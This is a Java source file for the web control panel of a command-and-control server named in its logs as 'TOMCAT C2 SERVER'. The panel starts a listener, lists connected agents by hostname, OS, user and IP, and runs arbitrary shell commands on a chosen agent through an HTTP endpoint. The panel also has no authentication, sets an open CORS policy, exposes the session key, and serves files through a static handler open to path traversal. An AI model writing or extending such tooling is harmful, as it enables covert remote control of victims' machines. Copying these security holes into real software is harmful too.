package com.tomcat.iface;

import com.google.gson.Gson;
import com.sun.net.httpserver.*;
import com.tomcat.core.event.EventManager;
import com.tomcat.core.event.EventManager.EventType;
import com.tomcat.core.output.Logger;
import com.tomcat.core.server.TomcatServer;
import com.tomcat.core.session.Session;
import com.tomcat.utils.ServerConfig;
import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.time.*;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.*;

public class WebApp {

    private final ServerConfig Config;
    private final boolean UseMtls;
    private TomcatServer Server;
    private HttpServer HttpSrv;
    private Instant ServerStartTime;
    private final List<String> Logs = new CopyOnWriteArrayList<>();
    private final int MaxLogs;
    private final Gson GsonInst = new Gson();
    private final Path BaseDir;

    public WebApp(ServerConfig Config, boolean UseMtls) {
        this.Config = Config;
        this.UseMtls = UseMtls;
        this.MaxLogs = Config.GetMaxLogEntries();
        this.BaseDir = ResolveBaseDir();
    }

    private Path ResolveBaseDir() {
        try {
            Path JarPath = Paths.get(WebApp.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            Path Parent = JarPath.getParent();
            if (Parent != null) {
                if (Files.exists(Parent.resolve("config"))) return Parent.toAbsolutePath();
                Path GrandParent = Parent.getParent();
                if (
                    GrandParent != null && Files.exists(GrandParent.resolve("config"))
                ) return GrandParent.toAbsolutePath();
            }
        } catch (Exception Ignored) {}
        Path Cwd = Paths.get("").toAbsolutePath();
        if (Files.exists(Cwd.resolve("config"))) return Cwd;
        Path CwdParent = Cwd.getParent();
        if (CwdParent != null && Files.exists(CwdParent.resolve("config"))) return CwdParent;
        return Cwd;
    }

    private Path ResolvePath(String Relative) {
        Path Direct = Paths.get(Relative);
        if (Direct.isAbsolute() && Files.exists(Direct)) return Direct;
        Path FromBase = BaseDir.resolve(Relative);
        if (Files.exists(FromBase)) return FromBase;
        Path FromCwd = Paths.get("").toAbsolutePath().resolve(Relative);
        if (Files.exists(FromCwd)) return FromCwd;
        return FromBase;
    }

    public void Run(String WebHost, int WebPort) throws Exception {
        InetSocketAddress Addr = new InetSocketAddress(WebHost, WebPort);
        HttpSrv = HttpServer.create(Addr, 100);
        SetupRoutes();
        HttpSrv.setExecutor(Executors.newFixedThreadPool(20));
        HttpSrv.start();
        Logger.Messages("Web Panel Started On http://" + WebHost + ":" + WebPort);
        Logger.Messages("Press Ctrl+C To Stop");
        Logger.Messages("Static Dir : " + ResolvePath(Config.GetStaticDir()));
        Logger.Messages("Template Dir: " + ResolvePath(Config.GetTemplateDir()));
        AddLog("=".repeat(70));
        AddLog("TOMCAT C2 SERVER - SYSTEM INITIALIZED");
        AddLog("=".repeat(70));
    }

    private void SetupRoutes() {
        HttpSrv.createContext("/", new StaticHandler());
        HttpSrv.createContext("/api/server/status", Exc -> HandleRequest(Exc, this::ApiServerStatus));
        HttpSrv.createContext("/api/server/start", Exc -> HandleRequest(Exc, this::ApiServerStart));
        HttpSrv.createContext("/api/server/stop", Exc -> HandleRequest(Exc, this::ApiServerStop));
        HttpSrv.createContext("/api/agents", Exc -> HandleRequest(Exc, this::ApiGetAgents));
        HttpSrv.createContext("/api/logs", Exc -> HandleRequest(Exc, this::ApiGetLogs));
        HttpSrv.createContext("/api/logs/clear", Exc -> HandleRequest(Exc, this::ApiClearLogs));
        HttpSrv.createContext("/api/command/execute", Exc -> HandleRequest(Exc, this::ApiExecuteCommand));
    }

    @FunctionalInterface
    interface RequestHandler {
        String Handle(HttpExchange E) throws Exception;
    }

    private void HandleRequest(HttpExchange E, RequestHandler Handler) {
        try {
            E.getResponseHeaders().add("Content-Type", "application/json");
            E.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
            E.getResponseHeaders().add("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
            E.getResponseHeaders().add("Access-Control-Allow-Headers", "Content-Type");
            if (E.getRequestMethod().equalsIgnoreCase("OPTIONS")) {
                E.sendResponseHeaders(200, -1);
                return;
            }
            String Response = Handler.Handle(E);
            byte[] Bytes = Response.getBytes("UTF-8");
            E.sendResponseHeaders(200, Bytes.length);
            try (OutputStream Os = E.getResponseBody()) {
                Os.write(Bytes);
            }
        } catch (Exception Ex) {
            try {
                String Err = GsonInst.toJson(Map.of("Error", Ex.getMessage()));
                byte[] Bytes = Err.getBytes("UTF-8");
                E.sendResponseHeaders(500, Bytes.length);
                try (OutputStream Os = E.getResponseBody()) {
                    Os.write(Bytes);
                }
            } catch (IOException Ignored) {}
        }
    }

    private String ApiServerStatus(HttpExchange E) {
        if (Server != null && Server.IsRunning()) {
            Map<String, Object> Resp = new LinkedHashMap<>();
            Resp.put("Status", "Online");
            Resp.put("Host", Server.GetHost());
            Resp.put("Port", Server.GetPort());
            Resp.put("StartedAt", ServerStartTime != null ? ServerStartTime.getEpochSecond() : 0);
            Resp.put("Uptime", GetUptime());
            Resp.put("Agents", Server.GetSessions().Count());
            Resp.put("Key", Server.GetCrypto().GetKeyAsBase64Url());
            Resp.put("MtlsEnabled", UseMtls);
            return GsonInst.toJson(Resp);
        }
        return GsonInst.toJson(Map.of("Status", "Offline", "Agents", 0, "MtlsEnabled", UseMtls));
    }

    private String ApiServerStart(HttpExchange E) throws Exception {
        if (Server != null && Server.IsRunning()) return GsonInst.toJson(
            Map.of("Success", false, "Message", "Server Already Running")
        );
        Map<String, Object> Body = ParseBody(E);
        String Host = Body.getOrDefault("Host", Config.GetServerHost()).toString();
        int Port = (int) Double.parseDouble(Body.getOrDefault("Port", Config.GetServerPort()).toString());
        boolean Mtls = this.UseMtls;
        Server = new TomcatServer(Host, Port, Mtls, Config);
        Server.AddEventListener(this::EventHandler);
        boolean[] Result = Server.StartServer();
        if (!Result[0]) {
            AddLog("[!] Failed to start server");
            return GsonInst.toJson(Map.of("Success", false, "Message", "Failed to start server"));
        }
        ServerStartTime = Instant.now();
        AddLog("[+] Server started on " + Host + ":" + Port);
        AddLog("[+] Session Key: " + Server.GetCrypto().GetKeyAsBase64Url());
        Thread AccThread = new Thread(Server::AcceptConnections, "AcceptConnections");
        AccThread.setDaemon(true);
        AccThread.start();
        Map<String, Object> Resp = new LinkedHashMap<>();
        Resp.put("Success", true);
        Resp.put("Message", "Server started on " + Host + ":" + Port);
        Resp.put("Host", Host);
        Resp.put("Port", Port);
        Resp.put("StartedAt", ServerStartTime.getEpochSecond());
        Resp.put("Key", new String(Server.GetCrypto().GetKey()));
        return GsonInst.toJson(Resp);
    }

    private String ApiServerStop(HttpExchange E) {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(
            Map.of("Success", false, "Message", "Server not running")
        );
        Server.StopServer();
        Server = null;
        ServerStartTime = null;
        AddLog("[!] Server Stopped");
        return GsonInst.toJson(Map.of("Success", true, "Message", "Server Stopped"));
    }

    private String ApiGetAgents(HttpExchange E) {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(Map.of("Agents", Collections.emptyList()));
        List<Map<String, Object>> Agents = new ArrayList<>();
        for (Session S : Server.GetSessions().GetAll()) {
            Map<String, Object> A = new LinkedHashMap<>();
            A.put("ID", S.GetId());
            A.put("Address", S.GetRemoteAddress());
            A.put("OS", S.GetOs());
            A.put("Hostname", S.GetHostname());
            A.put("User", S.GetUser());
            A.put("Arch", S.GetArch());
            A.put("AgentIP", S.GetAgentIp());
            A.put("AgentName", S.GetAgentName());
            A.put("JoinedAt", S.GetJoinedAt());
            A.put("Type", S.GetSessionType().name());
            A.put("ShellMode", S.GetShellMode());
            Agents.add(A);
        }
        return GsonInst.toJson(Map.of("Agents", Agents));
    }

    private String ApiGetLogs(HttpExchange E) {
        return GsonInst.toJson(Map.of("Logs", new ArrayList<>(Logs)));
    }

    private String ApiClearLogs(HttpExchange E) {
        Logs.clear();
        return GsonInst.toJson(Map.of("Success", true));
    }

    private String ApiExecuteCommand(HttpExchange E) throws Exception {
        if (Server == null || !Server.IsRunning()) return GsonInst.toJson(
            Map.of("Success", false, "Output", "Server not running")
        );
        Map<String, Object> Body = ParseBody(E);
        int AgentId = (int) Double.parseDouble(Body.getOrDefault("AgentId", 0).toString());
        String Command = Body.getOrDefault("Command", "").toString();
        if (AgentId == 0 || Command.isEmpty()) return GsonInst.toJson(
            Map.of("Success", false, "Output", "Missing AgentId or Command")
        );
        AddLog("[>] Agent " + AgentId + " | Executing: " + Command);
        String[] Result = Server.ExecuteCommand(AgentId, Command);
        boolean Ok = Boolean.parseBoolean(Result[0]);
        if (Ok) AddLog("[+] Output:\n" + Result[1]);
        else AddLog("[!] Error: " + Result[1]);
        return GsonInst.toJson(Map.of("Success", Ok, "Output", Result[1], "Command", Command));
    }

    private void EventHandler(EventType Type, Map<String, Object> Data) {
        switch (Type) {
            case AgentConnected -> AddLog(
                String.format(
                    "[+] New Session [%s] ID:%s Hostname:%s OS:%s User:%s",
                    Data.get("Type"),
                    Data.get("ID"),
                    Data.get("Hostname"),
                    Data.get("OS"),
                    Data.get("User")
                )
            );
            case AgentDisconnected -> AddLog(
                "[!] Session Disconnected ID:" + Data.get("ID") + " Reason:" + Data.get("Reason")
            );
            case Error -> AddLog("[!] " + Data.get("Message"));
        }
    }

    private Map<String, Object> ParseBody(HttpExchange E) throws Exception {
        try (InputStream Is = E.getRequestBody()) {
            String Body = new String(Is.readAllBytes(), "UTF-8");
            if (Body.isEmpty()) return new HashMap<>();
            return GsonInst.fromJson(Body, Map.class);
        }
    }

    private void AddLog(String Msg) {
        String Ts = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        Logs.add("[" + Ts + "] " + Msg);
        if (Logs.size() > MaxLogs) Logs.remove(0);
    }

    private String GetUptime() {
        if (ServerStartTime == null) return "00:00:00";
        long Secs = Duration.between(ServerStartTime, Instant.now()).getSeconds();
        return String.format("%02d:%02d:%02d", Secs / 3600, (Secs % 3600) / 60, Secs % 60);
    }

    class StaticHandler implements HttpHandler {

        private final String StaticPrefix = "/static";

        @Override
        public void handle(HttpExchange E) throws IOException {
            String ReqPath = E.getRequestURI().getPath();

            Path Target = null;

            if (ReqPath.equals("/") || ReqPath.equals("/index.html")) {
                Path TplPath = ResolvePath(Config.GetTemplateDir() + "/index.html");
                if (Files.exists(TplPath)) Target = TplPath;
            } else if (ReqPath.startsWith(StaticPrefix + "/")) {
                String RelPath = ReqPath.substring(StaticPrefix.length());
                Path StaticPath = ResolvePath(Config.GetStaticDir() + RelPath);
                if (Files.exists(StaticPath) && !Files.isDirectory(StaticPath)) Target = StaticPath;
            } else {
                Path StaticPath = ResolvePath(Config.GetStaticDir() + ReqPath);
                if (Files.exists(StaticPath) && !Files.isDirectory(StaticPath)) Target = StaticPath;
            }

            if (Target == null) {
                byte[] Resp = ("404 Not Found: " + ReqPath).getBytes();
                E.sendResponseHeaders(404, Resp.length);
                try (OutputStream Os = E.getResponseBody()) {
                    Os.write(Resp);
                }
                return;
            }

            String ContentType = GetContentType(Target.toString());
            E.getResponseHeaders().add("Content-Type", ContentType);
            byte[] Data = Files.readAllBytes(Target);
            E.sendResponseHeaders(200, Data.length);
            try (OutputStream Os = E.getResponseBody()) {
                Os.write(Data);
            }
        }

        private String GetContentType(String Path) {
            if (Path.endsWith(".html")) return "text/html; charset=UTF-8";
            if (Path.endsWith(".css")) return "text/css";
            if (Path.endsWith(".js")) return "application/javascript";
            if (Path.endsWith(".json")) return "application/json";
            if (Path.endsWith(".png")) return "image/png";
            if (Path.endsWith(".ico")) return "image/x-icon";
            return "application/octet-stream";
        }
    }
}
